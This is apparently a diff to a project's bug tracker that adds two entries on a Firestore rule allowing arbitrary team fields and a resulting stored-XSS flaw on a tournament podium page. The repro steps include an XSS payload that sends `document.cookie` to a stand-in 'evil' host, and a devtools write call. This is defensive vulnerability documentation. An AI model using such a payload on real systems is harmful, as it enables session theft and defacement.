@@ -33,6 +33,26 @@ Status: `open` · `in-progress` · `fixed-not-deployed` · `resolved`.
 
 _From the 2026-07-21 verify-first triage of the marathon backlog (38 items → 14 real). P2s logged individually; the P3 tail is one cluster entry. Resolved/not-a-bug items were cleaned from the marathon backlog, not re-filed here._
 
+### BUG-024 — `tournaments/*/teams` create rule accepts any field of any type (no validation)  ·  P1  ·  open
+- **Found:** 2026-07-24 · by Nancy (adversarial review of broadcast.html Phase A) · tournament broadcast build
+- **Area:** `firestore.rules:787` — `match /teams/{teamId} { allow create: if request.auth != null; ... }`
+- **Symptom:** any authenticated user (any student) can create a team doc in ANY tournament with arbitrary fields of arbitrary types — e.g. `score` as an HTML/JS string instead of a number, or a `color` carrying a CSS payload. Because `teams` read is public (`allow read: if true`) and every standings surface (podium, broadcast, admin) renders these fields, a malicious value becomes a stored-XSS / defacement vector on high-visibility screens (see BUG-023). `update` is effectively locked (captain is a dead null field + isAdmin) but `create` is wide open, so an attacker needs no update access.
+- **Repro:** from devtools on any authed page: `firebase.firestore().collection('tournaments/<id>/teams').add({name:'x', score:'<img src=x onerror=...>'})`.
+- **Root cause:** the create rule authenticates the writer but does not constrain the document shape (no `request.resource.data.score is number`, no field whitelist, no team-membership / tournament-state check).
+- **Fix:** NOT YET — needs a `firestore.rules` change (type-constrain score/solves, whitelist fields, ideally restrict team creation to the join flow / a Cloud Function). Bigger blast radius than one page; scope + review the rules change separately before deploying. Client-side defense-in-depth already landed in broadcast.html (`num()` / `sanitizeColor()`).
+- **Verified:** rule read directly (`firestore.rules:786-788`).
+- **Related:** BUG-023 (the render-side XSS this enables); broadcast.html Phase A (defended client-side).
+
+### BUG-023 — `tournament-podium.html` renders `team.score` unescaped (stored XSS)  ·  P1  ·  open (podium) / fixed (broadcast.html)
+- **Found:** 2026-07-24 · by Nancy (adversarial review of broadcast.html Phase A) · tournament broadcast build
+- **Area:** `_app/arena/tournament-podium.html:433` and `:450` — `(t.score || 0)` interpolated into innerHTML with no escape/coercion.
+- **Symptom:** a team whose `score` field is an HTML string (writable via BUG-024) executes script in the browser of anyone viewing the podium — including a projected screen at a live event, the highest-value defacement target on the platform. The same pattern would have shipped in broadcast.html (3 render paths) but was coerced before commit.
+- **Repro:** create a team with `score` = `<img src=x onerror=fetch('//evil/'+document.cookie)>` (via BUG-024), open the podium for that tournament.
+- **Root cause:** numeric field assumed numeric and interpolated raw; every text field on the page is escaped but the numerics are not.
+- **Fix:** broadcast.html — coerced all interpolated numerics via `num()` = `Number(v)||0` + hex-whitelisted `sanitizeColor()` (this session, pre-commit). Podium — NOT YET; needs the same coercion at `:433`/`:450` (and any other raw numeric interpolation). Pairs with the BUG-024 rules fix.
+- **Verified:** broadcast fix grep-clean (no `(t.score||0)` in render paths); podium lines confirmed unescaped by read.
+- **Related:** BUG-024 (enabler); broadcast.html Phase A.
+
 ### BUG-022 — CTF tournament standings have no tie-break; positions can be wrong on score ties  ·  P1  ·  RESOLVED (deployed + live-verified 2026-07-24)
 - **Found:** 2026-07-24 · by self · during HCA (Hexworth Credential Authority) design — grounding the credential design in the live tournament that feeds it
 - **Area:** `_app/arena/tournament-podium.html` (canonical standings surface): teams pulled via `.collection('teams').orderBy('score', 'desc')` (line ~351); `renderLeaderboard()` (line 357) ranks purely by that array order (`rank = i + 1`, `top3 = teams.slice(0,3)`).
